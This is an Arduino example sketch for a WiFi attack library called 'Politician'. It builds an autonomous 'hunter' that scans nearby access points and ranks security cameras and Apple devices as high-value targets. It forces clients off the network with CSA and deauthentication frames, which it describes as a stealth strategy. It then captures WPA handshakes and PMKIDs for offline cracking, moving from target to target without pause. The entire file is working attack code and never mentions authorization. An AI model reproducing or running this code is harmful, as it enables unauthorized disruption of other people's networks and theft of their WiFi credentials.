/*
 * AutonomousHunter.ino
 *
 * This example demonstrates the advanced "Autonomous Hunter" capabilities of the 
 * Politician library. It uses the internal OUI database and the TargetScoreCallback
 * to intelligently prioritize high-value targets (like Apple devices or Security Cameras)
 * while ignoring uninteresting noise. 
 * 
 * It also showcases the STRATEGY_AUTO_FALLBACK disconnection method for stealth.
 */

#include <Arduino.h>
#include <Politician.h>

using namespace politician;

Politician engine;

// 1. Define your targeting policy
// The engine will call this for every new AP it finds. 
// The AP with the highest score will be targetted next.
int hunterScore(const ApRecord &ap, const char *vendor) {
    // Start with the signal strength as a base (e.g., -60)
    int score = ap.rssi; 

    // --- POLICY: Prioritize by Vendor ---
    if (strstr(vendor, "Apple")) {
        Serial.printf("[Hunter] Found Apple device (%s) - Prioritizing +50 pts\n", ap.ssid);
        score += 50;
    } 
    else if (strstr(vendor, "Hikvision") || strstr(vendor, "Dahua")) {
        Serial.printf("[Hunter] Found Security Camera (%s) - High Priority +100 pts\n", ap.ssid);
        score += 100;
    }
    else if (strstr(vendor, "Espressif")) {
        // Many DIY/IoT devices use ESP32 - maybe we want to ignore them
        score -= 20;
    }

    // --- POLICY: Prioritize by Client Activity ---
    // APs that already have connected clients are much easier to capture
    if (ap.sta_count > 0) {
        score += 30;
    }

    // --- POLICY: Requirements ---
    if (ap.is_hidden) score -= 100; // Harder to capture
    if (ap.rssi < -80) score -= 100; // Too far away

    return score;
}

void onHandshake(const HandshakeRecord &rec) {
    Serial.printf("\n[!] SUCCESS: Captured %s from %s (Vendor: %s)\n", 
                  rec.type == CAP_PMKID ? "PMKID" : "Handshake",
                  rec.ssid, 
                  Politician::getVendor(rec.bssid));
}

void setup() {
    Serial.begin(115200);
    delay(2000);
    Serial.println("\n--- Politician: Autonomous Hunter Example ---");

    // 2. Configure the Engine
    Config cfg;
    cfg.smart_hopping = true; // Use traffic-aware hopping to save time
    
    if (engine.begin(cfg) != politician::OK) {
        Serial.println("WiFi Init Failed!");
        while(1) delay(100);
    }

    // 3. Setup Callbacks
    engine.setEapolCallback(onHandshake);
    
    // Set our custom scoring policy
    engine.setTargetScoreCallback(hunterScore);

    // 4. Setup Stealth Strategy
    // Chaining CSA then Deauth is much stealthier than blasting both at once.
    engine.setDisconnectionStrategy(STRATEGY_AUTO_FALLBACK);

    // 5. Start the Hunt
    engine.setAutoTarget(true); // Automatically move from target to target
    engine.setAttackMask(ATTACK_ALL);
    engine.startHopping();

    Serial.println("Hunter is active. Searching for high-value targets...");
}

void loop() {
    // The engine handles the state machine, timing, and fallback automatically.
    engine.tick();
}
